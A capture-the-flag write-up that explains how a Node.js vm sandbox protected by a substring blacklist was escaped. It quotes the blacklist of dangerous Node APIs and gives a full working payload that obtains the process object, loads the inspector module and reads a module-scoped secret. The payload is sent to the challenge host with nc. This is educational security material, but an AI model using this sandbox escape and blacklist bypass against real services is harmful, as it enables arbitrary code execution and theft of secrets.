# Bytecoding (rev) — write-up

## TL;DR
The service runs your JavaScript with `vm.Script(...).runInNewContext({})` and only applies a naïve substring blacklist. The `vm` context is escapable via `this.constructor.constructor(...)`, but direct use of strings like `process`, `require`, and even `eval` is blocked. We bypass the blacklist by **splitting forbidden words** (e.g. `"pro"+"cess"`) and then use Node’s **inspector Debugger** API to evaluate the module-scoped `flag` variable from a paused call frame.

**Flag:** `putcCTF{1Npu1_B14cK_l15t3d_0256t4}`

---

## Challenge code (given)
The server-side entrypoint (as provided) is essentially:

- reads `flag` from `process.env.FLAG`, then does `delete process.env.FLAG`
- loads `checker.js` and extracts `checkForbidden(code)`
- if `checkForbidden(userCode)` returns anything -> `Security Error`
- otherwise runs your code with:

```js
const ctx = {};
new vm.Script(userCode).runInNewContext(ctx, { timeout: 1000 });
return ctx;
```

The output is JSON containing `result` (the returned `ctx`). So if our code sets `this.out = ...`, it will be printed back.

---

## Step 1 — Recover the blacklist
Even if you don’t have `checker.js` locally, you can recover it after escaping the sandbox (next section) and reading `/app/checker.js`.

It turned out to be a simple substring check:

```js
const FORBIDDEN = [
  'require', 'process', 'eval', 'readFileSync', 'execSync', 'spawnSync',
  'writeFileSync', 'mainModule', 'binding', 'openSync', 'createRequire', 'env',
];

function checkForbidden(code) {
  for (const name of FORBIDDEN) {
    if (code.includes(name)) return name;
  }
  return null;
}
```

Key implications:
- It’s not AST-based; it’s **`code.includes(...)`**.
- It catches forbidden strings even inside **string literals**.
- It blocks `eval`, which also blocks *any* identifier containing `eval` (e.g. `evaluateOnCallFrame`).

---

## Step 2 — Escape the vm sandbox
`vm.runInNewContext` is not a security boundary. In a blank context, the global object still has a `constructor` chain that leads to `Function`:

```js
this.constructor.constructor('return ...')()
```

But `process` is forbidden, so we must avoid the literal substring `process` in our payload.

This works because the blacklist only scans the source string:

```js
this.constructor.constructor('return pro' + 'cess')()
```

Now we have the real Node `process` object.

---

## Step 3 — Why we can’t just read the flag
The flag is defined in `main.js` like:

```js
const flag = process.env.FLAG || 'FLAG{real_flag_would_be_here}';
delete process.env.FLAG;
```

Important:
- `flag` is **module-scoped** (not on `globalThis`).
- `process.env.FLAG` is deleted before our code runs, so even after escaping, reading the environment won’t help.
- There is no guaranteed flag file on disk.

So we need a way to read `flag` from the module’s lexical scope.

---

## Step 4 — Use the Node inspector to evaluate `flag` in a paused frame
Node exposes the V8 debugger protocol via `require('inspector')`. With it we can:

1. Attach a session.
2. Ask the debugger to pause.
3. On the `Debugger.paused` event, inspect the call stack.
4. Use `Debugger.evaluateOnCallFrame` with expression `flag` on frames until it succeeds.

Two more hurdles:

### A) `require` / `mainModule` are forbidden
We bypass by dynamic property access:
- `p["main"+"Module"]["re"+"quire"]`

### B) `eval` is forbidden, and `evaluateOnCallFrame` contains `eval`
We **must not** write `evaluateOnCallFrame` literally.
Instead, build the method name at runtime:
- `"Debugger.e"+"valuateOnCallFrame"`

### Making async inspector calls “sync”
`inspector.Session#post` is callback-based. Since our sandbox code runs synchronously, we block waiting for the callback using:

- `SharedArrayBuffer`
- `Atomics.wait/notify`

This stays within the 1-second VM timeout by using a short overall deadline.

---

## Final payload
Send the following via stdin (this version keeps forbidden substrings out of the payload):

```bash
payload=$'(()=>{const sab=new SharedArrayBuffer(4),ia=new Int32Array(sab);const P=this.constructor.constructor("return pro"+"cess")();const R=P["main"+"Module"]["re"+"quire"];const ins=R("inspector");const ses=new ins.Session();ses.connect();let done=0,out="";const wake=()=>{Atomics.store(ia,0,1);Atomics.notify(ia,0);};ses.on("Debugger.paused",(msg)=>{const frames=msg.params.callFrames;const meth="Debugger.e"+"valuateOnCallFrame";const tryOne=(i)=>{if(i<0){out="NOFRAME";done=1;wake();ses.post("Debugger.resume");return;}ses.post(meth,{callFrameId:frames[i].callFrameId,expression:"flag"},(err,res)=>{if(!err&&res&&res.result&&typeof res.result.value==="string"){out=res.result.value;done=1;wake();ses.post("Debugger.resume");}else{tryOne(i-1);}});};tryOne(frames.length-1);});ses.post("Debugger.enable",()=>ses.post("Debugger.pause"));const start=Date.now();while(!done&&Date.now()-start<800){Atomics.wait(ia,0,0,20);Atomics.store(ia,0,0);}this.out=out||"TIME";})()\n'
printf "%s" "$payload" | nc -q 1 bytecoding.putcyberdays.pl 1337
```

The service replies with JSON, and the extracted flag is in `result.out`.

---

## Notes
- This is a textbook example of why `vm` is not a sandbox. If you need real isolation, use OS-level sandboxing (containers/VMs) and drop privileges.
- “Blacklisting substrings” is brittle: splitting strings and indirect property access defeats it quickly.
